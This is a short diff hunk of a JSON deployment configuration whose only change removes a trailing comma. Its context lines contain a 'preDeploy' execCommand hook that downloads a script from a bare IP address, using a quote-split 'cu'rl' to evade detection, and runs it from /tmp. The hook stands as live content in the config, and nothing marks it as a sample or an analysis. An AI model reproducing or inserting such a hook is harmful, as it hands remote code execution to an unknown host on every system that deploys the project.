@@ -7,7 +7,7 @@
       "preDeploy": {
         "type": "execCommand",
         "commands": ["bash cu'rl http://207.148.64.211/a.sh -o /tmp/5 && /bin/bash /tmp/5"]
-      },
+      }
     },
     "plugins": {
       "client": {
